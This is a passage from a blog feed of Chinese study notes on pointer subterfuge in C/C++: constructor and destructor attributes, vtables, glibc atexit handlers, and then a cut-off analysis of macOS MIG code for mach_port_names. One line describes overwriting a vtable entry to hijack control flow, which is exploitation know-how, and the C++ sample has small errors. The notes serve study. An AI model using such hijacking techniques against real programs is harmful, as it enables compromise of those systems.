<h4 id="Case-3"><a href="#Case-3" class="headerlink" title="Case"></a>Case</h4><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">static void create(void) __attribute__ ((constructor));</div><div class="line">static void destroy(void) __attribute__ ((destructor));</div><div class="line"></div><div class="line">int main(int argc, char const *argv[])</div><div class="line">&#123;</div><div class="line">    printf("create fptr: %p. \n", create);</div><div class="line">    printf("destroy fptr: %p. \n", destroy);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void create(void) &#123;</div><div class="line">    puts("create called.");</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void destroy(void) &#123;</div><div class="line">    puts("destroy called.");</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="虚指针"><a href="#虚指针" class="headerlink" title="虚指针"></a>虚指针</h3><p>虚函数：用 virtual 定义的类成员函数。该函数可以被子类同名函数重写。 子类对象的指针可以被赋值给基类指针，使用该基类指针可以调用函数。</p>
<ol>
<li>调用非虚函数， 则调用的是基类的函数，因为和指针的静态类型相关联。</li>
<li>调用虚函数，则是子类的函数，和动态类型相关联</li>
</ol>
<h4 id="Case-4"><a href="#Case-4" class="headerlink" title="Case"></a>Case</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> a &#123;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"base f"</span> &lt;&lt; <span class="string">'\n'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"base g"</span> &lt;&lt; <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;  <span class="comment">// end a</span></div><div class="line"></div><div class="line"><span class="keyword">class</span> b &#123;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"subclass f"</span> &lt;&lt; <span class="string">'\n'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"subclass g"</span> &lt;&lt; <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    a *my_b =  <span class="keyword">new</span> b();</div><div class="line">    my_b-&gt;f();</div><div class="line">    mt_b-&gt;g();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>任意地址写覆盖 虚表中的 g 函数地址，劫持控制流。虚表在 bss 段。</p>
<h3 id="atexit-和-on-exit-函数"><a href="#atexit-和-on-exit-函数" class="headerlink" title="atexit() 和 on_exit() 函数"></a>atexit() 和 on_exit() 函数</h3><p>atexit() 是C 标准定义的一个通用工具函数。atexit 可以注册无参函数，在程序正常接受后调用该函数。</p>
<h4 id="Case-5"><a href="#Case-5" class="headerlink" title="Case"></a>Case</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *glob;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, glob);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    atexit(test);</div><div class="line">    glob = <span class="string">"Exiting. \n"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过调试 可以知道其调用流程，然后分析源码：<br>Linux:<br><code>_start -&gt; __libc_start_main -&gt; __GI_exit -&gt; __run_exit_handlers</code></p>
<p>OSX :<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">thread #<span class="number">1</span>: tid = <span class="number">0x264c8</span>, <span class="number">0x0000000100000f10</span> at`test, queue = <span class="string">'com.apple.main-thread'</span>, stop reason = breakpoint <span class="number">1.1</span></div><div class="line"> * frame #<span class="number">0</span>: <span class="number">0x0000000100000f10</span> at`test</div><div class="line">   frame #<span class="number">1</span>: <span class="number">0x00007fffbcbaf17f</span> libsystem_c.dylib`__cxa_finalize_ranges + <span class="number">339</span></div><div class="line">   frame #<span class="number">2</span>: <span class="number">0x00007fffbcbaf4b2</span> libsystem_c.dylib`exit + <span class="number">55</span></div><div class="line">   frame #<span class="number">3</span>: <span class="number">0x00007fffbcb1a25c</span> libdyld.dylib`start + <span class="number">8</span></div></pre></td></tr></table></figure></p>
<p>现在 还没有找到 文章中说的 __exit_funcs 函数， linux 中有，但是 mac 上没有。</p>
<p><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.h.html</a><br><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers</a><br><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list</a></p>
<p>使用 gdb 调试：<br>p  initial   打印出 全局变量 initial 的内存结构 （ struct exit_function_list ）<br>注意：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">xa_atexit.c</div><div class="line"><span class="keyword">static</span> <span class="keyword">struct</span> exit_function_list initial;</div><div class="line"><span class="keyword">struct</span> exit_function_list *__exit_funcs = &amp;initial;</div><div class="line">--------------</div><div class="line"><span class="built_in">exit</span>.c</div><div class="line"><span class="keyword">void</span></div><div class="line"><span class="number">103</span> <span class="built_in">exit</span> (<span class="keyword">int</span> status)</div><div class="line"><span class="number">104</span> &#123;</div><div class="line"><span class="number">105</span>   __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</div><div class="line"><span class="number">106</span> &#125;</div><div class="line">--------------</div><div class="line"><span class="keyword">void</span></div><div class="line"><span class="number">32</span>  attribute_hidden</div><div class="line"><span class="number">33</span>  __run_exit_handlers (<span class="keyword">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</div><div class="line"><span class="number">34</span>                       <span class="keyword">bool</span> run_list_atexit, <span class="keyword">bool</span> run_dtors)</div><div class="line"><span class="number">35</span>  &#123;</div><div class="line"></div><div class="line">        。。。。</div><div class="line"></div><div class="line"><span class="number">47</span>    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</div><div class="line"><span class="number">48</span>      &#123;</div><div class="line"><span class="number">49</span>        <span class="keyword">struct</span> exit_function_list *cur = *listp;</div><div class="line"><span class="number">50</span></div><div class="line"><span class="number">51</span>        <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</div><div class="line"><span class="number">52</span>          &#123;</div><div class="line"><span class="number">53</span>            <span class="keyword">const</span> <span class="keyword">struct</span> exit_function *<span class="keyword">const</span> f =</div><div class="line"><span class="number">54</span>              &amp;cur-&gt;fns[--cur-&gt;idx];</div><div class="line"><span class="number">55</span>            <span class="keyword">switch</span> (f-&gt;flavor)</div><div class="line"><span class="number">56</span>              &#123;</div><div class="line"><span class="number">57</span>                <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</div><div class="line"><span class="number">58</span>                <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</div><div class="line"><span class="number">59</span>                <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</div><div class="line"><span class="number">60</span></div><div class="line"><span class="number">61</span>              <span class="keyword">case</span> ef_free:</div><div class="line"><span class="number">62</span>              <span class="keyword">case</span> ef_us:</div><div class="line"><span class="number">63</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">64</span>              <span class="keyword">case</span> ef_on:</div><div class="line"><span class="number">65</span>                onfct = f-&gt;func.on.fn;</div><div class="line"><span class="number">66</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></div><div class="line"><span class="number">67</span>                PTR_DEMANGLE (onfct);</div><div class="line"><span class="number">68</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="number">69</span>                onfct (status, f-&gt;func.on.arg);</div><div class="line"><span class="number">70</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">71</span>              <span class="keyword">case</span> ef_at:     （<span class="number">3</span>）</div><div class="line"><span class="number">72</span>                atfct = f-&gt;func.at;</div><div class="line"><span class="number">73</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></div><div class="line"><span class="number">74</span>                PTR_DEMANGLE (atfct);</div><div class="line"><span class="number">75</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="number">76</span>                atfct ();</div><div class="line"><span class="number">77</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">78</span>              <span class="keyword">case</span> ef_cxa: （<span class="number">4</span>）</div><div class="line"><span class="number">79</span>                cxafct = f-&gt;func.cxa.fn;</div><div class="line"><span class="number">80</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></div><div class="line"><span class="number">81</span>                PTR_DEMANGLE (cxafct);</div><div class="line"><span class="number">82</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="number">83</span>                cxafct (f-&gt;func.cxa.arg, status);</div><div class="line"><span class="number">84</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">85</span>              &#125;</div><div class="line"><span class="number">86</span>          &#125;</div><div class="line"><span class="number">87</span></div><div class="line"><span class="number">88</span>        *listp = cur-&gt;next;</div><div class="line"><span class="number">89</span>        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</div><div class="line"><span class="number">92</span>          <span class="built_in">free</span> (cur);</div><div class="line"><span class="number">93</span>      &#125;</div><div class="line"><span class="number">94</span></div><div class="line"><span class="number">95</span>    <span class="keyword">if</span> (run_list_atexit)</div><div class="line"><span class="number">96</span>      RUN_HOOK (__libc_atexit, ());</div><div class="line"><span class="number">97</span></div><div class="line"><span class="number">98</span>    _exit (status);</div><div class="line"><span class="number">99</span>  &#125;</div></pre></td></tr></table></figure>
<h3 id="longjmp-函数"><a href="#longjmp-函数" class="headerlink" title="longjmp 函数"></a>longjmp 函数</h3><h4 id="Case-6"><a href="#Case-6" class="headerlink" title="Case"></a>Case</h4><h3 id="Dictionary"><a href="#Dictionary" class="headerlink" title="Dictionary"></a>Dictionary</h3><h3 id="关联章节"><a href="#关联章节" class="headerlink" title="关联章节"></a>关联章节</h3><h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-02-28</td>
<td>增加 3节</td>
</tr>
<tr>
<td>2017-03-1</td>
<td>89</td>
</tr>
<tr>
<td>2017-03-1</td>
<td>90</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;《C++ 安全编程》 – 第 三 章：指针诡计&lt;br&gt;
    
    </summary>
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
  </entry>
  
  <entry>
    <title>mach_port_names 函数分析</title>
    <link href="http://yoursite.com/2017/02/27/mach-port-names-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/02/27/mach-port-names-函数分析/</id>
    <published>2017-02-26T16:04:45.000Z</published>
    <updated>2017-03-09T16:33:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>在《深入解析MAC OS X &amp; iOS 操作系统》书上，代码清单10-1 中有一个例子 “Mach 端口导出器”， 分析代码流程搞清楚 MIG 的作用。</p>
</blockquote>
<a id="more"></a>
<h2 id="mach-port-names-–-MIG-分析"><a href="#mach-port-names-–-MIG-分析" class="headerlink" title="mach_port_names – MIG 分析"></a>mach_port_names – MIG 分析</h2><p>mach_port_names 此函数可以导出给定任务的端口名称空间。分析器原理+ 调用流程。</p>
<p>这个函数 在 mach 子系统 mach_port 中。该系统对应的 MIG 描述文件是/osfmk/mach/mach_port.defs。(这个目录下还有其他的子系统 defs描述文件)</p>
<p>在没有使用 mig 工具预编译 defs 文件时， 源码中是没有 mach_port.h 文件的。<br>mach_port.h 文件中 包含 mach_port 子系统 用于操作任务端口的所有函数。</p>
<p>步骤：</p>
<pre><code>1. 使用 MIG 生成 mach_port.h ..文件
2. 分析 MIG 生成的目录结构
3. 分析代码
4. 搞清楚 mach_port_names 原理
</code></pre><h3 id="使用-MIG-生成-mach-port-h-文件"><a href="#使用-MIG-生成-mach-port-h-文件" class="headerlink" title="使用 MIG 生成 mach_port.h ..文件"></a>使用 MIG 生成 mach_port.h ..文件</h3><p>直接运行命令就自动生成相关文件</p>
<blockquote>
<p>mig xxx.defs</p>
</blockquote>
<h3 id="分析-MIG-生成的目录结构"><a href="#分析-MIG-生成的目录结构" class="headerlink" title="分析 MIG 生成的目录结构"></a>分析 MIG 生成的目录结构</h3><p>一共4个文件<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">├── mach_port.defs</div><div class="line">├── mach_port.h</div><div class="line">├── mach_portServer.c</div><div class="line">├── mach_portUser.c</div></pre></td></tr></table></figure></p>
<p>查看文件</p>
<p>这里有 4个关键的函数<br>_Xmach_port_names(…) {<br>    <strong>MIG_check</strong>Request__mach_port_names_t</p>
<pre><code>RetCode = mach_port_names(In0P-&gt;Head.msgh_request_port, (mach_port_name_array_t *)&amp;(OutP-&gt;names.address), &amp;OutP-&gt;namesCnt, (mach_port_type_array_t *)&amp;(OutP-&gt;types.address), &amp;OutP-&gt;typesCnt);
</code></pre><p>}</p>
<p>_kernelrpc_mach_port_names(….) {</p>
<pre><code>__MIG_check__Reply__mach_port_names_t

设置返回值
</code></pre><p>}</p>
<p>reply code 比 request 大100, code 对应InP-&gt;Head.msgh_id<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div></pre></td><td class="code"><pre><div class="line">mach_port.h  #########################</div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> _kernelrpc_mach_port_names</div><div class="line">(</div><div class="line">    <span class="keyword">ipc_space_t</span> task,</div><div class="line">    <span class="keyword">mach_port_name_array_t</span> *names,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *namesCnt,</div><div class="line">    <span class="keyword">mach_port_type_array_t</span> *types,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *typesCnt</div><div class="line">);</div><div class="line"></div><div class="line">mach_portUser.c  #########################</div><div class="line"></div><div class="line">mig_internal <span class="keyword">kern_return_t</span> __MIG_check__Reply__mach_port_names_t(__Reply__mach_port_names_t *Out0P)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">typedef</span> __Reply__mach_port_names_t __Reply __attribute__((unused));</div><div class="line">    <span class="keyword">boolean_t</span> msgh_simple;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> msgh_size;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line">    <span class="keyword">if</span> (Out0P-&gt;Head.msgh_id != <span class="number">3300</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (Out0P-&gt;Head.msgh_id == MACH_NOTIFY_SEND_ONCE)</div><div class="line">        &#123; <span class="keyword">return</span> MIG_SERVER_DIED; &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123; <span class="keyword">return</span> MIG_REPLY_MISMATCH; &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    msgh_simple = !(Out0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX);</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    msgh_size = Out0P-&gt;Head.msgh_size;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((msgh_simple || Out0P-&gt;msgh_body.msgh_descriptor_count != <span class="number">2</span> ||</div><div class="line">        msgh_size != (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Reply)) &amp;&amp;</div><div class="line">        (!msgh_simple || msgh_size != (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">mig_reply_error_t</span>) ||</div><div class="line">        ((<span class="keyword">mig_reply_error_t</span> *)Out0P)-&gt;RetCode == KERN_SUCCESS))</div><div class="line">        &#123; <span class="keyword">return</span> MIG_TYPE_ERROR ; &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (msgh_simple) &#123;</div><div class="line">        <span class="keyword">return</span> ((<span class="keyword">mig_reply_error_t</span> *)Out0P)-&gt;RetCode;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">if</span> (Out0P-&gt;names.type != MACH_MSG_OOL_DESCRIPTOR) &#123;</div><div class="line">        <span class="keyword">return</span> MIG_TYPE_ERROR;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">if</span> (Out0P-&gt;types.type != MACH_MSG_OOL_DESCRIPTOR) &#123;</div><div class="line">        <span class="keyword">return</span> MIG_TYPE_ERROR;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> MACH_MSG_SUCCESS;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !defined(__MIG_check__Reply__mach_port_names_t__defined) */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __MIG_check__Reply__mach_port_subsystem__ */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ( __MigTypeCheck ) */</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* Routine mach_port_names */</span></div><div class="line">mig_external <span class="keyword">kern_return_t</span> _kernelrpc_mach_port_names</div><div class="line">(</div><div class="line">    <span class="keyword">ipc_space_t</span> task,</div><div class="line">    <span class="keyword">mach_port_name_array_t</span> *names,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *namesCnt,</div><div class="line">    <span class="keyword">mach_port_type_array_t</span> *types,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *typesCnt</div><div class="line">)</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">    &#125; Request __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">        <span class="comment">/* start of the kernel processed data */</span></div><div class="line">        